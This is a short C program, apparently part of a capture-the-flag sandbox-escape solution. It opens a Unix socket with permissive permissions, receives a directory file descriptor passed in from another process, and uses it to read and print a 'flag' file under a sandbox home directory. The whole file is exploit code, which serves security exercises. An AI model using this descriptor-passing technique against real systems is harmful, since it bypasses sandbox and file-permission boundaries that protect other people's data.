#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

int main(int argc, char **argv) {
  struct sockaddr_un addr = {0};
  int sock = socket(AF_UNIX, SOCK_STREAM, 0);
  addr.sun_family = AF_UNIX;
  strcpy(addr.sun_path, "./sock");
  unlink(addr.sun_path);

  umask(0);
  bind(sock, (struct sockaddr *) &addr, sizeof(addr));
  listen(sock, 1);

  int client_sock = accept(sock, NULL, NULL);

  struct msghdr msg = {0};
  char control_buffer[CMSG_LEN(sizeof(int))];
  msg.msg_control = control_buffer;
  msg.msg_controllen = sizeof(control_buffer);

  recvmsg(client_sock, &msg, 0);

  struct cmsghdr* cmsg = CMSG_FIRSTHDR(&msg);
  int dir_fd = *(int*) CMSG_DATA(cmsg);

  // This is unnecessarily complicated. It would have sufficed to create
  // a setuid binary :-)
  char buf[1024];
  int flag_fd = openat(dir_fd, "home/sandbucket/flag", O_RDONLY);
  ssize_t len = read(flag_fd, buf, sizeof(buf));
  printf("Here it comes...\n");
  write(1, buf, len);
  return 0;
}
